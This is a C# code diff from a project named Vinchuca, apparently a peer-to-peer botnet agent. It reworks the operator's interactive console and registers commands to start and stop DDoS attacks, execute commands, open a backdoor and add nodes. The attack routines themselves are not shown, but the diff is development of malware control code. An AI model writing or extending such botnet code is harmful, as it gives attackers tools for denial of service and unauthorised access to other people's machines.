@@ -45,19 +45,24 @@ namespace Vinchuca
             agent.Run();
             agent.Bootstrap(peers);
 
-            var repl = new CommandLineReader();
+            var console = new VirtualConsole(0, 20);
+            ConsolesManager.Instance.SetFocus(console);
+            Console.SetCursorPosition(0, 21);
+            Console.Write(new string('=', Console.BufferWidth));
+            var repl = new CommandLineReader(console);
 
-            var suite = new CommandSet("vicha") {
+            var suite = new CommandSet("vicha", null, console, console) {
 		        "usage: COMMAND [OPTIONS]+.",
                 "Available commands are:",
                 "",
                 // { "v:", "verbosity", (int? v) => Verbosity = v.HasValue ? v.Value : Verbosity+1 },
 		        // Commands may also be specified
-		        new DDoSCommand(agent),
-                new ExecuteCommand(agent),
-                new BackdoorCommand(agent),
-                new AddNodeCommand(agent),
-                new DebugCommand(agent),
+		        new DDoSStartCommand(agent, repl),
+                new DDoSStopCommand(agent, repl),
+                new ExecuteCommand(agent, repl),
+                new BackdoorCommand(agent, repl),
+                new AddNodeCommand(agent, repl),
+                new DebugCommand(agent, repl),
                 new Command("clear", "Clear the screen")
                 {
                     Run = x=>repl.Clear()
@@ -69,7 +74,7 @@ namespace Vinchuca
             };
 
             repl.NewCommand += (sender, eventArgs) => 
-                suite.Run(eventArgs.Command.Split(new char[] {' '}, StringSplitOptions.RemoveEmptyEntries));
+                suite.Run(eventArgs.Command.Split(new [] {' '}, StringSplitOptions.RemoveEmptyEntries));
             repl.Run();
         }
     }
